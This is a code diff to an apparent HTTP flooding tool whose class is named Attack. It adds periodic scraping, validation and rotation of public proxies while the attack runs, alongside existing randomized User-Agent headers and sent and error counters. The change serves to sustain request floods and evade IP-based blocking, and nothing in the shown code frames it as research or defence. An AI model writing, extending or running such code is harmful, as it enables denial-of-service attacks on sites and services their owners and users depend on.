@@ -181,10 +181,37 @@ class Attack:
         self.mode = mode
         self.use_proxy = use_proxy
         self.proxies = []
+        self.proxy_lock = threading.Lock()
+        self.proxy_refresh_interval = 60
         self.running = True
         self.sent = 0
         self.errors = 0
         self.lock = threading.Lock()
+
+    def _load_proxies(self):
+        """scrape + validate a fresh proxy list and swap it in."""
+        try:
+            proxies = scrape_proxies()
+            proxies = [p for p in proxies if p]
+            valid = filter_proxies(proxies)
+            fresh = [{"http": p, "https": p} for p in valid]
+            with self.proxy_lock:
+                self.proxies = fresh
+            print(f"\n   {DIM}proxies refreshed: {len(fresh)} working{RESET}")
+        except Exception:
+            print(f"\n   {DIM}proxy refresh failed, keeping current list{RESET}")
+
+    def _proxy_refresher(self):
+        """periodically re-scrape and re-validate proxies while running."""
+        while self.running:
+            time.sleep(self.proxy_refresh_interval)
+            self._load_proxies()
+
+    def _pick_proxy(self):
+        with self.proxy_lock:
+            if self.use_proxy and self.proxies:
+                return random.choice(self.proxies)
+        return None
 
     def run(self):
         print()
@@ -202,6 +229,7 @@ class Attack:
             else:
                 print(f"\r   {DIM}no working proxies found, going direct{RESET}" + " " * 30)
             print()
+            threading.Thread(target=self._proxy_refresher, daemon=True).start()
 
         start = time.time()
 
@@ -237,7 +265,7 @@ class Attack:
                 if not self.running:
                     break
                 headers = {"User-Agent": random.choice(USER_AGENTS)}
-                proxy = random.choice(self.proxies) if (self.use_proxy and self.proxies) else None
+                proxy = self._pick_proxy()
 
                 if self.mode == "soft":
                     try:
